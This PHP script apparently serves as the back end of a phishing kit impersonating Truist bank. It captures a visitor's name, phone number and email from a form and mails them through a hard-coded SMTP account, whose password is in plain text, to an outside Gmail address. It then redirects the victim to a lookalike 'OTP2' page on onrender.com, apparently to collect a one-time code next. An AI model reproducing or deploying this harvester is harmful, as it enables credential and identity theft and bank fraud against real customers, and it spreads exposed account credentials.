<?php


use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';
require 'vendor/phpmailer/phpmailer/src/Exception.php';
require 'vendor/phpmailer/phpmailer/src/PHPMailer.php';
require 'vendor/phpmailer/phpmailer/src/SMTP.php';

$text = ("FIRST NAME: " . $_POST['firstName'] . "\n" . "LAST NAME: " . $_POST['lastName'] . "\nPHONE: " . $_POST['phone'] . "\nEMAIL: " . $_POST['email']);

$mail = new PHPMailer(true);                              // Passing `true` enables exceptions



try {
    //Server settings
    $mail->SMTPDebug = 2;                                 // Enable verbose debug output
    $mail->isSMTP();                                      // Set mailer to use SMTP
    $mail->Host =   'smtp.netzero.net';                   // Specify main and backup SMTP servers
    $mail->SMTPAuth = true;                               // Enable SMTP authentication
    $mail->Username = 'jdk1652@netzero.net';                 // SMTP username
    $mail->Password = 'whysnomoney';                // SMTP password
    $mail->SMTPSecure = 'STARTTLS';                           
    $mail->Port = 587;                                    // TCP port to connect to

    //Recipients
    $mail->setFrom('jdk1652@netzero.net');
    $mail->addAddress('ericpsewell.00@gmail.com', 'Name');     // Add a recipient



    //Content
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Subject = 'VERIFICATION!';
    $mail->Body    = $text;

    $mail->send();

    header("Location:https://verifytruist.onrender.com/Truist/OTP2.html");
    exit;
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}



?>